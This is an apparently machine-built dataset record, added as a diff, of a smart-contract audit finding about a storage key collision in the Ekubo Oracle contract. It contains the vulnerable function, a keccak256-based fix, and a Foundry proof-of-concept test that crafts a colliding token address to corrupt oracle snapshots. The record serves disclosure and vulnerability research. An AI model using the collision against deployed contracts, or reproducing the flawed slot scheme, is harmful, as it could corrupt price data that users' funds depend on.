@@ -1,0 +1,130 @@
+{
+  "id": "64660",
+  "extraction_type": "github_complete",
+  "source_url": "https://github.com/code-423n4/2025-11-ekubo/blob/main/src/extensions/Oracle.sol# L97-L100",
+  "is_complete": true,
+  "tier": "tier_1",
+  "referenced_lines": [
+    [
+      97,
+      100
+    ],
+    [
+      108,
+      111
+    ],
+    [
+      139,
+      142
+    ]
+  ],
+  "filename": "64660_Oracle.sol",
+  "has_pragma": true,
+  "has_contract": true,
+  "has_function": true,
+  "balanced_braces": true,
+  "num_lines": 421,
+  "vulnerability_title": "[M-01] Oracle Data Corruption via Storage Key Collision",
+  "recommendation": {
+    "has_recommendation": true,
+    "recommendation_text": "Use `keccak256` to derive the snapshot storage slot to avoid collisions.\n```\n\n// src/extensions/Oracle.sol\n\nfunction getSnapshotSlot(address token, uint32 index) private pure returns (bytes32 slot) {\n    assembly (\"memory-safe\") {\n        mstore(0, token)\n        mstore(32, index)\n        slot := keccak256(0, 64)\n    }\n}\n```\n\nAnd replace the assembly `sload`/`sstore` calls to use this computed slot.",
+    "fix_code_blocks": [
+      "// src/extensions/Oracle.sol\n\nfunction getSnapshotSlot(address token, uint32 index) private pure returns (bytes32 slot) {\n    assembly (\"memory-safe\") {\n        mstore(0, token)\n        mstore(32, index)\n        slot := keccak256(0, 64)\n    }\n}"
+    ]
+  },
+  "poc": {
+    "has_poc": true,
+    "poc_text": "Note: The provided PoC requires replacing the assembly clz instruction with LibBit.clz (or equivalent) in src/math/ticks.sol, src/types/bitmap.sol, and src/math/time.sol if the testing environment\u2019s compiler does not support the clz instruction. This modification is purely for compilation compatibility and does not affect the vulnerability logic.\n\nThe following test demonstrates the collision. Add this to `test/OracleCollision.t.sol`.\n```\n\n// SPDX-License-Identifier: ekubo-license-v1.eth\npragma solidity >=0.8.30;\n\nimport {PoolKey} from \"../src/types/poolKey.sol\";\nimport {createFullRangePoolConfig} from \"../src/types/poolConfig.sol\";\nimport {FullTest} from \"./FullTest.sol\";\nimport {oracleCallPoints} from \"../src/extensions/Oracle.sol\";\nimport {IOracle} from \"../src/interfaces/extensions/IOracle.sol\";\nimport {CoreLib} from \"../src/libraries/CoreLib.sol\";\nimport {OracleLib} from \"../src/libraries/OracleLib.sol\";\nimport {Snapshot} from \"../src/types/snapshot.sol\";\nimport {Counts} from \"../src/types/counts.sol\";\nimport {NATIVE_TOKEN_ADDRESS} from \"../src/math/constants.sol\";\n\ncontract OracleCollisionTest is FullTest {\n    using CoreLib for *;\n    using OracleLib for *;\n\n    IOracle internal oracle;\n\n    function setUp() public virtual override {\n        FullTest.setUp();\n        address deployAddress = address(uint160(oracleCallPoints().toUint8()) << 152);\n        deployCodeTo(\"Oracle.sol\", abi.encode(core), deployAddress);\n        oracle = IOracle(deployAddress);\n    }\n\n    function createOraclePool(address quoteToken, int32 tick) internal returns (PoolKey memory poolKey) {\n        poolKey = createPool(NATIVE_TOKEN_ADDRESS, quoteToken, tick, createFullRangePoolConfig(0, address(oracle)));\n    }\n\n    function test_collision_between_token_counts_and_snapshot() public {\n        // 1. Choose tokenB as a small address (mimicking an address with leading zeros)\n        // Avoid precompiles (1-9)\n        address tokenB = address(100);\n\n        // 2. Calculate colliding tokenA\n        // Slot for snapshot index 0 of tokenB is: (tokenB << 32) | 0\n        address tokenA = address(uint160(uint256(uint160(tokenB)) << 32));\n\n        // 3. Initialize Pool with tokenB\n        // This initializes Counts at slot `tokenB`\n        createOraclePool(tokenB, 0);\n        uint32 initTime = oracle.snapshots(tokenB, 0).timestamp();\n\n        // 4. Verify initial state of Snapshot 0 (it should be empty/zero or init state)\n        // Actually createOraclePool calls beforeInitializePool which initializes Snapshot 0.\n        Snapshot s0 = oracle.snapshots(tokenB, 0);\n        uint32 timestamp0 = s0.timestamp();\n        assertEq(timestamp0, initTime);\n\n        // 5. Initialize Pool with tokenA\n        // This writes Counts to slot `tokenA`, which IS the slot for Snapshot 0 of tokenB\n        vm.warp(block.timestamp + 100);\n        createOraclePool(tokenA, 0);\n\n        // 6. Verify Corruption\n        Snapshot s0_corrupted = oracle.snapshots(tokenB, 0);\n\n        // Counts.index (0) overwrites Snapshot.timestamp\n        uint32 corruptedTimestamp = s0_corrupted.timestamp();\n\n        assertEq(corruptedTimestamp, 0);\n        assert(corruptedTimestamp != timestamp0);\n\n        // Counts data overwrites secondsPerLiquidityCumulative\n        uint160 corruptedSPC = s0_corrupted.secondsPerLiquidityCumulative();\n        assert(corruptedSPC != 0);\n    }\n}\n```\n\n---",
+    "poc_code_blocks": [
+      "// SPDX-License-Identifier: ekubo-license-v1.eth\npragma solidity >=0.8.30;\n\nimport {PoolKey} from \"../src/types/poolKey.sol\";\nimport {createFullRangePoolConfig} from \"../src/types/poolConfig.sol\";\nimport {FullTest} from \"./FullTest.sol\";\nimport {oracleCallPoints} from \"../src/extensions/Oracle.sol\";\nimport {IOracle} from \"../src/interfaces/extensions/IOracle.sol\";\nimport {CoreLib} from \"../src/libraries/CoreLib.sol\";\nimport {OracleLib} from \"../src/libraries/OracleLib.sol\";\nimport {Snapshot} from \"../src/types/snapshot.sol\";\nimport {Counts} from \"../src/types/counts.sol\";\nimport {NATIVE_TOKEN_ADDRESS} from \"../src/math/constants.sol\";\n\ncontract OracleCollisionTest is FullTest {\n    using CoreLib for *;\n    using OracleLib for *;\n\n    IOracle internal oracle;\n\n    function setUp() public virtual override {\n        FullTest.setUp();\n        address deployAddress = address(uint160(oracleCallPoints().toUint8()) << 152);\n        deployCodeTo(\"Oracle.sol\", abi.encode(core), deployAddress);\n        oracle = IOracle(deployAddress);\n    }\n\n    function createOraclePool(address quoteToken, int32 tick) internal returns (PoolKey memory poolKey) {\n        poolKey = createPool(NATIVE_TOKEN_ADDRESS, quoteToken, tick, createFullRangePoolConfig(0, address(oracle)));\n    }\n\n    function test_collision_between_token_counts_and_snapshot() public {\n        // 1. Choose tokenB as a small address (mimicking an address with leading zeros)\n        // Avoid precompiles (1-9)\n        address tokenB = address(100);\n\n        // 2. Calculate colliding tokenA\n        // Slot for snapshot index 0 of tokenB is: (tokenB << 32) | 0\n        address tokenA = address(uint160(uint256(uint160(tokenB)) << 32));\n\n        // 3. Initialize Pool with tokenB\n        // This initializes Counts at slot `tokenB`\n        createOraclePool(tokenB, 0);\n        uint32 initTime = oracle.snapshots(tokenB, 0).timestamp();\n\n        // 4. Verify initial state of Snapshot 0 (it should be empty/zero or init state)\n        // Actually createOraclePool calls beforeInitializePool which initializes Snapshot 0.\n        Snapshot s0 = oracle.snapshots(tokenB, 0);\n        uint32 timestamp0 = s0.timestamp();\n        assertEq(timestamp0, initTime);\n\n        // 5. Initialize Pool with tokenA\n        // This writes Counts to slot `tokenA`, which IS the slot for Snapshot 0 of tokenB\n        vm.warp(block.timestamp + 100);\n        createOraclePool(tokenA, 0);\n\n        // 6. Verify Corruption\n        Snapshot s0_corrupted = oracle.snapshots(tokenB, 0);\n\n        // Counts.index (0) overwrites Snapshot.timestamp\n        uint32 corruptedTimestamp = s0_corrupted.timestamp();\n\n        assertEq(corruptedTimestamp, 0);\n        assert(corruptedTimestamp != timestamp0);\n\n        // Counts data overwrites secondsPerLiquidityCumulative\n        uint160 corruptedSPC = s0_corrupted.secondsPerLiquidityCumulative();\n        assert(corruptedSPC != 0);\n    }\n}"
+    ]
+  },
+  "problem_code": {
+    "has_problem_code": true,
+    "source": "github_line_refs_function_scope",
+    "snippets": [
+      {
+        "function_name": "maybeInsertSnapshot",
+        "start_line": 95,
+        "end_line": 146,
+        "code": "    function maybeInsertSnapshot(PoolId poolId, address token) private {\n        unchecked {\n            Counts c;\n            assembly (\"memory-safe\") {\n                c := sload(token)\n            }\n\n            uint32 timePassed = uint32(block.timestamp) - c.lastTimestamp();\n            if (timePassed == 0) return;\n\n            uint32 index = c.index();\n\n            // we know count is always g.t. 0 in the places this is called\n            Snapshot last;\n            assembly (\"memory-safe\") {\n                last := sload(or(shl(32, token), index))\n            }\n\n            PoolState state = CORE.poolState(poolId);\n\n            uint128 liquidity = state.liquidity();\n            uint256 nonZeroLiquidity;\n            assembly (\"memory-safe\") {\n                nonZeroLiquidity := add(liquidity, iszero(liquidity))\n            }\n\n            Snapshot snapshot = createSnapshot({\n                _timestamp: uint32(block.timestamp),\n                _secondsPerLiquidityCumulative: last.secondsPerLiquidityCumulative()\n                    + uint160(FixedPointMathLib.rawDiv(uint256(timePassed) << 128, nonZeroLiquidity)),\n                _tickCumulative: last.tickCumulative() + int64(uint64(timePassed)) * state.tick()\n            });\n\n            uint32 count = c.count();\n            uint32 capacity = c.capacity();\n\n            bool isLastIndex = index == count - 1;\n            bool incrementCount = isLastIndex && capacity > count;\n\n            if (incrementCount) count++;\n            index = (index + 1) % count;\n            uint32 lastTimestamp = uint32(block.timestamp);\n\n            c = createCounts({_index: index, _count: count, _capacity: capacity, _lastTimestamp: lastTimestamp});\n            assembly (\"memory-safe\") {\n                sstore(token, c)\n                sstore(or(shl(32, token), index), snapshot)\n            }\n\n            _emitSnapshotEvent(token, snapshot);\n        }\n    }",
+        "confidence": 97,
+        "reason": "Function enclosing GitHub-referenced vulnerable line",
+        "matched_references": [
+          [
+            97,
+            100
+          ],
+          [
+            108,
+            111
+          ],
+          [
+            139,
+            142
+          ]
+        ]
+      }
+    ]
+  },
+  "extraction_date": "2026-04-16T17:55:56.644549",
+  "validation": {
+    "content_code_consistency": {
+      "consistent": true,
+      "confidence": 95,
+      "summary_matches": true,
+      "content_matches": true,
+      "summary_reasoning": "The summary accurately describes the vulnerability of storage key collisions leading to data corruption in the Oracle contract.",
+      "content_reasoning": "The content discusses the specific functions and variables involved in the vulnerability, including the `Counts` and `Snapshot` structs, and the assembly code that leads to the collision.",
+      "functions_found": [
+        "maybeInsertSnapshot"
+      ],
+      "variables_found": [
+        "c",
+        "last",
+        "snapshot"
+      ],
+      "patterns_found": [
+        "storage key collision",
+        "data corruption"
+      ],
+      "issues": []
+    },
+    "report_tag_validation": {
+      "existing_tag": "None",
+      "tag_present": false,
+      "tag_correct": null,
+      "confidence": 90,
+      "reasoning": "There is no existing tag, and a relevant tag should be assigned to reflect the nature of the vulnerability.",
+      "suggested_tag": "Oracle Data Corruption",
+      "alternative_tags": [
+        "Storage Collision",
+        "Data Integrity"
+      ],
+      "correction_explanation": "The vulnerability specifically relates to oracle data corruption due to storage key collisions, which should be reflected in the tagging."
+    },
+    "mando_classification": {
+      "primary_category": "null",
+      "secondary_categories": [],
+      "confidence": 85,
+      "mando_applicable": false,
+      "reasoning": "The MANDO categories do not adequately capture the specific nature of the vulnerability related to oracle data corruption and storage key collisions."
+    },
+    "scsvs_classification": {
+      "primary_category": "C3",
+      "primary_category_name": "Oracle",
+      "secondary_categories": [
+        "G4",
+        "G9"
+      ],
+      "confidence": 90,
+      "use_scsvs_instead": true,
+      "reasoning": "The SCSVS categories provide a more granular classification that accurately reflects the vulnerability's impact on oracle functionality and data integrity.",
+      "vulnerability_type": "Oracle data corruption via storage key collision"
+    },
+    "fix_code_source": "provided",
+    "validated_at": "2026-04-16T17:58:30.378991",
+    "model": "gpt-4o-mini",
+    "code_input_source": "github_line_refs_function_scope"
+  }
+}
